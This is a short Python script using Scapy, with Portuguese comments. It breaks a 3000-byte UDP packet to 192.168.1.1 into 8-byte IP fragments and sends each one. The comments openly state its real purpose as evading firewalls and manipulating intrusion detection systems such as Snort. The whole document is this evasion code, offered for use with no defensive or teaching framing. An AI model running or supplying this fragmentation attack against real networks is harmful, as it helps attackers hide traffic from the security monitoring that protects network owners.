# Divide um pacote IP em fragmentos falsos que podem confundir firewalls e IDS.
# 👉 Uso real: Evasão de firewalls e manipulação de IDS (ex: Snort).



from scapy.all import *

pkt = IP(dst="192.168.1.1")/UDP()/("X"*3000)
fragments = fragment(pkt, fragsize=8)
for frag in fragments:
    send(frag)
